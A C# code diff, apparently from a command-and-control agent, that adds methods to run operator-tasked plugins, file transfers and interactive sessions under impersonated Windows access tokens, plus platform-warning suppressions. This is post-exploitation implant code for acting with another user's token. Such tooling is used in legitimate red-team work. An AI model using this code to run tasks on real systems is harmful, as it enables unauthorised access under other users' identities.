@@ -15,6 +15,8 @@ namespace Agent.Managers
         {
             this.logger = logger;
         }
+
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
         public bool Impersonate(int i)
         {
             if (tokens.ContainsKey(i))
@@ -23,6 +25,34 @@ namespace Agent.Managers
             }
             return false;
         }
+
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
+        public void RunTaskImpersonated(IPlugin plug, ServerJob job)
+        {
+            _ = WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), async () =>
+            {
+                await plug.Execute(job);
+            });
+        }
+
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
+        public void HandleFilePluginImpersonated(IFilePlugin plug, ServerJob job, ServerResponseResult response)
+        {
+            _ = WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), async () =>
+            {
+                await plug.HandleNextMessage(response);
+            });
+        }
+
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
+        public void HandleInteractivePluginImpersonated(IInteractivePlugin plug, ServerJob job, InteractMessage message)
+        {
+            WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), () =>
+            {
+                plug.Interact(message);
+            });
+        }
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
         public string List(ServerJob job)
         {
             Dictionary<string, string> toks = new Dictionary<string, string>();
@@ -42,6 +72,7 @@ namespace Agent.Managers
         {
             return Pinvoke.RevertToSelf();
         }
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
         public int getIntegrity()
         {
             bool isAdmin;
@@ -53,6 +84,7 @@ namespace Agent.Managers
 
             return isAdmin ? 3 : 2;
         }
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
         public TokenResponseResult AddToken(SafeAccessTokenHandle hToken, CreateToken tokenOptions, string task_id)
         {
             Token token = new Token()
@@ -92,6 +124,7 @@ namespace Agent.Managers
             };
         }
 
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Validate platform compatibility", Justification = "This will only ever be compiled for Windows")]
         public SafeAccessTokenHandle GetImpersonationContext(int id)
         {
             return tokens[id];
